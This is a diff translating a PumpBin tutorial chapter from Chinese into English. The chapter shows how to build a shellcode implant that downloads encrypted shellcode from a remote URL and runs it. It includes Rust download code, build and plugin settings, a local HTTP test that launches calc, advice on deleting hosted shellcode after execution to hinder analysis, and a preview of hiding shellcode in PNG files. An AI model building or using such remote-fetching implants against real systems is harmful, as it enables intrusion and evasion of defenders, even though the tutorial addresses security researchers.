@@ -1,28 +1,28 @@
 # Remote Type
 
-在这一章, 我们将制作一个`Remote`类型的Plugin.
+In this chapter, we will create a plugin of type `Remote`.
 
-`Remote`类型的Plugin, shellcode托管在远程服务器上, 可以通过控制shellcode的访问性, 使shellcode更难被提取分析, 从而保护基础设施.
+The shellcode of a plugin of type `Remote` is hosted on a remote server. By controlling the accessibility of the shellcode, it can be made more difficult to extract and analyze, thereby protecting the infrastructure.
 
-例如, 在植入物运行成功后, 将远程shellcode文件删除. (前提是你没有其他依赖这个链接的植入物需要运行)
+For example, delete the remote shellcode file after the implant has run successfully. (provided you don't have other implants that depend on this link running)
 
-建议始终给每个生成的最终植入物设置一个唯一的shellcode托管地址(一个最终植入物对应一个链接)
+It is recommended to always set a unique shellcode hosting address for each generated final implant (one final implant corresponds to one link)
 
-## 制作二进制植入物模板
+## Create binary implant template
 
-我们将在[上一章代码](https://github.com/pumpbin/pumpbin/tree/main/examples/create_thread_encrypt)的基础上进行修改
+We will modify the [previous chapter code](https://github.com/pumpbin/pumpbin/tree/main/examples/create_thread_encrypt)
 
-首先, 我们需要一种方式从远程服务器获取加密的shellcode文件, 而不是将shellcode占位数据预先包含到二进制植入物模板中.
+First, we need a way to get the encrypted shellcode file from the remote server, instead of including the shellcode placeholder data in the binary implant template in advance.
 
-删除build.rs (不再需要生成shellcode占位数据).
+Delete build.rs (no longer needed to generate shellcode placeholder data).
 
-在Cargo.toml末尾添加依赖项, 本例中使用http协议作为演示. (可以使用任何协议, 或以任何方式实现下载函数)
+Add dependencies to the end of Cargo.toml. In this example, the http protocol is used for demonstration purposes. (Any protocol can be used, or the download function can be implemented in any way)
 
 ```toml
 reqwest = { version = "0.12.5", features = ["blocking"] }
 ```
 
-在main.rs的main函数上添加如下下载函数
+Add the following download function to the main function of main.rs
 
 ```rust
 fn download() -> Vec<u8> {
@@ -37,25 +37,25 @@ fn download() -> Vec<u8> {
 }
 ```
 
-$$UURRLL$$是一个`Prefix`, 这意味着URL常量会以有效数据+随机数据填充, 所以建议预留一部分字节让PumpBin填充随机字节.
+$$UURRLL$$ is a `Prefix`, which means that the URL constant will be filled with valid data + random data, so it is recommended to reserve a certain number of bytes for PumpBin to fill with random bytes.
 
-由于url或之类的托管地址大部分都是可打印字符, 所以此处的处理与第一章中$$SHELLCODE$$ `Prefix`略有不同.
+Since URLs and the like are mostly printable characters, the processing here is slightly different from the $$$SHELLCODE$$ `Prefix` in Chapter 1.
 
-我们不再需要Size Holder来区分有效数据, 相反PumpBin会在有效数据后添加一个\\x00字节, 以定位有效数据.
-(所以实际最大URL长度会比Max Len少一个字节, 因为末尾一定会添加一个\\x00字节)
+We no longer need a size holder to distinguish between valid data and invalid data. Instead, PumpBin will add a \\x00 byte after the valid data to locate the valid data.
+(So the actual maximum URL length will be one byte less than Max Len because a \\x00 byte will be added at the end.)
 
-这在rust中很容易实现, 其他语言应该也有类似的实现. 如果没有, 只需要for循环逐字节判断是否是\\x00字节.
+This is easy to implement in Rust, and other languages should have similar implementations. If not, just use a for loop to check if it is a \\x00 byte byte by byte.
 
-实现了下载函数后, 我们需要在main.rs中使用它替换shellcode占位数据
+After implementing the download function, we need to use it in main.rs to replace the shellcode placeholder data
 
-删除main.rs中main函数的前四行代码, 并在第一行添加以下代码
+Delete the first four lines of the main function in main.rs and add the following code to the first line
 
 ```rust
 let shellcode = download();
 let shellcode = shellcode.as_slice();
 ```
 
-修改后的main函数如下
+The modified main function is as follows
 
 ```rust
 fn main() {
@@ -66,57 +66,58 @@ fn main() {
     ...
 ```
 
-编译修改后的`create_thread`项目, 我们将得到一个使用http协议下载加密shellcode文件的二进制植入物模板.
+Compiling the modified `create_thread` project, we will get a binary implant template that uses the http protocol to download the encrypted shellcode file.
 
 ```sh
 cargo b -r
 ```
 
-## 制作Plugin
+## Create Plugin
 
-使用PumpBin Maker制作Plugin, 与前面章节类似.
+Use PumpBin Maker to create a plugin, similar to the previous section.
 
-Prefix填写`$$UURRLL$$`
+Prefix: Enter `$$UURRLL$$`
 
-Max Len填写URL常量数组引用的长度 81.
+Max Len: Enter the length of the URL constant array reference. 81.
 
-Type选择`Remote`
+Type: Select `Remote`
 
-> 下载编译后的[aes256_gcm.wasm](https://github.com/pumpbin/plug-in/releases), 并将文件路径输入到到PumpBin Maker中的`Encrypt Shellcode Plug-in`输入框中. (也可以使用文件选择对话框选择下载的`aes256_gcm.wasm`文件)
+> Download the compiled [aes256_gcm.wasm](https://github.com/pumpbin/plug-in/releases) and enter the file path into the `Encrypt Shellcode Plug-in` input box in PumpBin Maker.
+> (You can also use the file selection dialog to select the downloaded `aes256_gcm.wasm` file)
 
-> Plugin Name填写first_plugin. (这个字段是Plugin的唯一标识, 这意味着用户无法同时安装两个同名的Plugin)
+> Plugin Name: Enter first_plugin. (This field is the unique identifier for the plugin, which means that users cannot install two plugins with the same name at the same time.)
 
-> Windows Exe选择我们上面编译好的二进制植入物模板. (也可以直接填写文件路径)
+> Windows Exe: Select the binary implant template we compiled above. (You can also directly enter the file path)
 
-> 点击Generate, 保存生成的b1n文件
+> Click Generate, save the generated b1n file
 
-## 测试Plugin
+## Test Plugin
 
-用PumpBin安装制作的Plugin, 点击Encrypt按钮选择`w64-exec-calc-shellcode-func`生成加密的shellcode文件.
+Use the PumpBin plugin to install the plugin, click the Encrypt button to select `w64-exec-calc-shellcode-func` to generate an encrypted shellcode file.
 
-使用Python3在加密后的shellcode文件同级目录下开启一个http服务
+Use Python 3 to start an HTTP service in the same directory as the encrypted shellcode file.
 
 ```sh
 python -m http.server 8000
 ```
 
-加密shellcode文件的本地http地址应该是`http://127.0.0.1:8000/shellcode.enc`
+The local http address of the encrypted shellcode file should be `http://127.0.0.1:8000/shellcode.enc`
 
-填入PumpBin, 生成最终植入物, 运行应该看到访问请求, calc程序被启动.
+Fill in PumpBin, generate the final implant, run it and you should see the access request, the calc program is started.
 
 <div class="warning">
 
-如果使用的Encrypt Shellcode Plug-in使用随机加密密码
+If you use the Encrypt Shellcode Plug-in with a random encryption password
 
-每次点击Encrypt按钮成功加密shellcode后, 都将更新内部记录的随机加密密码(因为需要将真实加密密码patch到二进制植入物模板中).
-如果你加密了一次shellcode(称其为shellcode0), 将shellcode0上传到远程服务器, 并将链接填写到PumpBin中,
-但是在生成最终植入物前, 又加密了一次shellcode(称其为shellcode1), 然后再生成最终植入物, 那么生成的最终植入物只能解密shellcode1, 而无法解密远程的shellcode0文件.
+the random encryption password recorded internally will be updated every time you click the Encrypt button to successfully encrypt the shellcode (because the real encryption password needs to be patched into the binary implant template).
+If you encrypt the shellcode once (call it shellcode0), upload shellcode0 to the remote server and fill in the link into PumpBin,
+but before generating the final implant, you encrypt the shellcode again (call it shellcode1), and then generate the final implant, then the final implant generated can only decrypt shellcode1, but not the remote shellcode0 file.
 
 </div>
 
-后续章节将介绍如何开发PumpBin Extism Plug-in, 以及更多的内部细节, 帮助赛博安全研究员应对复杂的需求.
+The following chapters will introduce how to develop the PumpBin Extism Plug-in and more internal details to help cyber security researchers deal with complex requirements.
 
-比如: 如何在用户点击Encrypt按钮加密shellcode后将加密的shellcode隐写到png文件中, 再将png文件上传到某个网站,
-上传成功后将远程png文件访问地址自动填写到shellcode url输入框中.
+For example, how to write the encrypted shellcode to a png file after the user clicks the Encrypt button to encrypt the shellcode, and then upload the png file to a website.
+After the upload is successful, the remote png file access address is automatically filled in the shellcode url input box.
 
-本例中的完整项目文件在PumpBin代码仓库的[examples/create_thread_remote](https://github.com/pumpbin/pumpbin/blob/main/examples/create_thread_remote/src/main.rs).
+The complete project file in this example is in the PumpBin code repository [examples/create_thread_remote](https://github.com/pumpbin/pumpbin/blob/main/examples/create_thread_remote/src/main.rs).
